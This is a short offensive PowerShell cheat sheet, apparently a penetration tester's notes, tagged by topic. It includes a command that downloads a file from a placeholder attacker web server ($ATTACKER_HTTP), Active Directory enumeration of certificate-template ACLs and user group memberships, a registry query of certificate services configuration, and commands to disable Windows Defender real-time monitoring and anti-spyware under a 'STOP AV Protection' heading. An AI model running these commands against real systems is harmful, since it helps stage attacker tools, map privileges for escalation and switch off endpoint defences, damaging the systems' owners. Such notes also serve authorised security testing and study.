Common utilities:
----
Download file from web server, invoke web request:
#powershell #powershell-download #powershell-wget #iwr #invoke-web-request

```powershell
IWR -uri $ATTACKER_HTTP/$FILE -Outfile $FILE
```

Get list  of all available modules:
---
#windows #modules #powershell 

```powershell
Get-Module -ListAvailable
```

Import psm1 module as user:
---
#import #windows #powershell 

```powershell
Import-Module .\$MODULE
```

AD Enum and stuff
---
#windows #powershell #ad #users #enum 

```powershell
Import-Module ActiveDirectory
cd AD:
$acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$TARGET_AD,DC=$AD_DOMAIN_EXT'
$acl.Access.Count
$acl.Access | where IdentityReference -match 'Domain Users'
```

Get User's Groups
---
#user #groups #windows #powershell 

```powershell
(Get-ADUser $USER –Properties MemberOf).MemberOf
```

or

```powershell
(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf
```

using "Get-ADPrincipalGroupMembership":

```powershell
Import-Module ActiveDirectory
Get-ADPrincipalGroupMembership -Identity $USER
```

or

```powershell
Get-ADPrincipalGroupMembership -Identity $USER | Sort-Object name | Format-Table -Expand name
```

Get AD Certificate configuration from the registry:
---
#enum #certificate #ad-template 

```powershell
reg query $TARGET_AD/HKLM/SYSTEM/CurrentControlSet/Services/CertSvc/Configuration/%3c$CA_NAME%3e
```

STOP AV Protection
---
#anti-virus #protection #stop #windows #powershell 


```powershell
Set-MpPreference -DisableRealtimeMonitoring $true  
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"-Name DisableAntiSpyware -Value 1-PropertyType DWORD -Force
```

or prepend command with:

```powershell
powershell -command $CMD
```